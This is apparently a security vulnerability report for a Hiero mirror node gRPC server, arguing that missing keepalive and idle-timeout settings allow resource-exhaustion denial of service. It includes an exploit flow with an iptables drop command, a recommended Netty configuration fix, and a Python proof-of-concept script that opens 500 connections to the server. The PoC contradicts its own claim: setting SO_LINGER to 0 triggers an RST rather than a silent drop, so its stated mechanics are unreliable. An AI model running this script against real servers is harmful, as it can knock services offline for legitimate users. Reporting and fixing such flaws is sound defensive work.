### Title
Missing TCP/gRPC Keepalive Allows Indefinite Dead-Connection Accumulation Leading to Resource Exhaustion DoS

### Summary
`grpcServerConfigurer()` configures only `executor` and `maxConcurrentCallsPerConnection` on the `NettyServerBuilder`, leaving no TCP `SO_KEEPALIVE`, no gRPC application-level keepalive (`keepAliveTime`/`keepAliveTimeout`), and no `maxConnectionIdle` timeout. A grep across the entire codebase confirms zero keepalive-related configuration exists anywhere. An unprivileged external attacker can open many TCP connections to port 5600, then silently drop them (without FIN/RST), causing the server to hold all connections open indefinitely and exhaust file descriptors and memory.

### Finding Description
**Exact code path:**

`grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java`, `grpcServerConfigurer()`, lines 28–35:

```java
return serverBuilder -> {
    serverBuilder.executor(applicationTaskExecutor);
    serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
};
```

`grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java`, lines 11–15:

```java
public class NettyProperties {
    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
}
```

**Root cause:** Netty's `NioServerSocketChannel` does not enable `SO_KEEPALIVE` by default. Without it, the OS never sends TCP keepalive probes on accepted sockets. No gRPC-level `keepAliveTime`/`keepAliveTimeout` is set, so no HTTP/2 PING frames are sent to probe liveness. No `maxConnectionIdle` or `maxConnectionAge` is configured, so there is no server-side idle eviction. A full-codebase grep for `maxConnectionIdle`, `maxConnectionAge`, `keepAliveTime`, `keepAliveTimeout`, `permitKeepAlive`, `SO_KEEPALIVE` returns **zero matches**.

**Why the only existing check fails:** `maxConcurrentCallsPerConnection = 5` limits the number of concurrent RPC streams *per connection*, not the number of connections. It provides no bound on how many dead connections accumulate.

**Exploit flow:**
1. Attacker opens N TCP connections to port 5600 and completes the HTTP/2 handshake (no authentication required for the gRPC endpoint).
2. Attacker drops all connections at the network layer without sending FIN or RST (e.g., `iptables -A OUTPUT -p tcp --dport 5600 -j DROP` after handshake, or `SO_LINGER` with `l_linger=0` on the client side, or simply killing the client process with SIGKILL).
3. The server has no mechanism to detect the dead connections: no TCP keepalive probes, no gRPC PING frames, no idle timeout.
4. Each dead connection holds OS file descriptors, Netty channel objects, and JVM heap. With `maxConcurrentCallsPerConnection = 5`, each connection also occupies up to 5 call-slot entries in the server's concurrency tracking.
5. Repeat until the server exhausts file descriptors (`Too many open files`) or JVM heap, causing a full service outage.

### Impact Explanation
The server accumulates dead connections indefinitely with no self-healing mechanism. File descriptor exhaustion prevents the server from accepting any new connections, causing a complete denial of service for all legitimate clients. Memory pressure from accumulated Netty channel state can trigger OOM. The `subscribeTopic` streaming RPC (with a 600 s nginx read timeout) makes long-lived connections the normal case, so the server is designed to hold connections open — making dead-connection accumulation especially damaging. Severity: **High** (unauthenticated, complete availability loss).

### Likelihood Explanation
The attack requires only network access to port 5600 and the ability to establish a TCP connection — no credentials, no special protocol knowledge beyond initiating an HTTP/2 handshake. The technique (drop without FIN/RST) is well-known and trivially scriptable. It is repeatable and can be automated to continuously open and silently drop connections. In cloud/Kubernetes deployments the gRPC port is exposed via a LoadBalancer service, making it reachable from the public internet.

### Recommendation
Add the following to `grpcServerConfigurer()` in `GrpcConfiguration.java`:

```java
import io.netty.channel.ChannelOption;
import java.util.concurrent.TimeUnit;

return serverBuilder -> {
    serverBuilder.executor(applicationTaskExecutor);
    serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
    // TCP-level keepalive: enable SO_KEEPALIVE so the OS sends probes
    serverBuilder.withChildOption(ChannelOption.SO_KEEPALIVE, true);
    // gRPC application-level keepalive: send HTTP/2 PING every 60 s
    serverBuilder.keepAliveTime(60, TimeUnit.SECONDS);
    serverBuilder.keepAliveTimeout(20, TimeUnit.SECONDS);
    // Evict connections idle for more than 5 minutes
    serverBuilder.maxConnectionIdle(300, TimeUnit.SECONDS);
    // Recycle connections after 1 hour regardless of activity
    serverBuilder.maxConnectionAge(3600, TimeUnit.SECONDS);
};
```

Expose the new parameters (`keepAliveTime`, `keepAliveTimeout`, `maxConnectionIdle`, `maxConnectionAge`) through `NettyProperties` so operators can tune them without code changes.

### Proof of Concept

```bash
# 1. Open 500 connections to the gRPC server and complete HTTP/2 handshake
python3 - <<'EOF'
import socket, ssl, threading

def connect_and_drop(i):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("grpc-server-host", 5600))
    # Send HTTP/2 client preface to complete handshake
    s.sendall(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")
    # Drop without FIN/RST: set SO_LINGER to 0 then close
    import struct
    s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
    # Do NOT close — just let the thread die, OS will RST
    # For a cleaner half-open: use iptables after connect instead
    print(f"Connection {i} established and dropped")

threads = [threading.Thread(target=connect_and_drop, args=(i,)) for i in range(500)]
for t in threads: t.start()
for t in threads: t.join()
EOF
```
